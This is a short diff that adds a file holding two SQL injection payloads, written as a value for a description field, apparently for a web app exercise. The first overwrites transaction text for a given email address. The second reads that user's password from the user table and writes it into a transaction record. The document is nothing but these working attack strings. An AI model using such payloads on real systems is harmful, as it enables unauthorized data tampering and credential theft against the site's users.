@@ -1,0 +1,7 @@
+
+
+
+beskrivelse'; UPDATE transaction SET text='beskrivelse' WHERE to_email='halla@data.no'; --
+
+
+beskrivelse'; UPDATE transaction SET text= ( SELECT password FROM user WHERE email='halla@data.no') WHERE to_email='halla@data.no'; --
